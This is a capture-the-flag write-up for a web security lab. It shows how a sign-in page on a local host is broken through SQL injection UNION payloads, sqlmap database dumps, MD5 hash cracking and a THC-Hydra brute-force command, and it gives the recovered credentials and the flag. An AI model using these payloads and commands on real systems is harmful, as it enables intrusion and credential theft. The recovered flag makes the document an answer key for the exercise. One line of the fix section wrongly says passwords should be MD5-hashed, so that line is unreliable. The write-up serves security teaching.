# Brute Force Sign In
- Method 1 & 3: Because members page was vulnerable to an sql injection attack we can enumerate databases for credentials.
- Method 2: Theres no limit to sign in requests so we can brute force it.

# Vulnerability Method 1

- Thanks to the vulnerability in search members:

``` sql
1 UNION SELECT table_name, table_schema FROM information_schema.tables
```

- Notice The Following:
    First name: db_default
    Surname : Member_Brute_Force

- It means we have a table called db_defaults inside Member_Brute_Force database.
  
- We can try to find all columns
    ``` sql
    1 UNION SELECT table_name, column_name FROM information_schema.columns
    ```
- We Notice The Table db_default from the [First name: db_default] output has these columns:
    __id, username, password__

- We Know now __db_default__ columns, we can select __url, comment__:
``` sql
1 UNION SELECT username, password FROM Member_Brute_Force.db_default
```
- We Can Notice This: 

    ID: 1 UNION SELECT username, password FROM Member_Brute_Force.db_default 
    First name: root
    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

    ID: 1 UNION SELECT username, password FROM Member_Brute_Force.db_default 
    First name: admin
    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
- Surname in this case is the password field.
- It is encrypted with md5, so if we decode it we get the output: __shadow__
- If we Login with the credentials **admin** and **shadow** it gives us the flag:
  B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

# Method 2
- In our particular case, we know that the username __admin__ exists.
- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt wordlist to use in this case.
- We can use Thc-Hydra: __sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:S=<Success-html-text>"__
- In our case the command would be __sudo hydra -l admin -P /Darkly/04_brute_force_sign-in/Ressources/wordlist.txt 192.168.1.38 http-get-form "/:page=signin&username=admin&password=^PASS^&Login=Login:S=flag"__
- Result is => [80][http-get-form] host: 192.168.1.38   login: admin   password: shadow
- We can also use that for "root" user.
- Also the password is exposed because the form method is GET.


# Vulnerability Method 3
- After Executing the command __sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" --dbs__ we notice a database named **Member_Brute_Force**
- This command __sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" -D Member_Brute_Force --tables__ shows us a table named **db_default**
- This command __sqlmap -u "http://192.168.1.38/?page=member&id=1&Submit=Submit#" -D Member_Brute_Force -T db_default --dump__ dumps us enteries in that table.
- We can crack those password by running a Dictionary attack specifically 'md5_generic_passwd' provided by sqlmap.
- the result is as follows:
    Database: Member_Brute_Force
    Table: db_default
    [2 entries]
+----+----------+-------------------------------------------+
| id | username | password                                  |
+----+----------+-------------------------------------------+
| 1  | root     | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
| 2  | admin    | 3bf1114a986ba87ed28fc1b5884fc2f8 (shadow) |
+----+----------+-------------------------------------------+
- Now we can access this website as admin and root.


# Fix
- We can prevent SQL injections by using prepared statements and parameterized queries.
- Passwords should md5 encrypted because its a weak hashing algorithm.
- We can set limit to request sent by clients.
- We can use POST method when handling passwords and generaly handling form data to prevent exposure.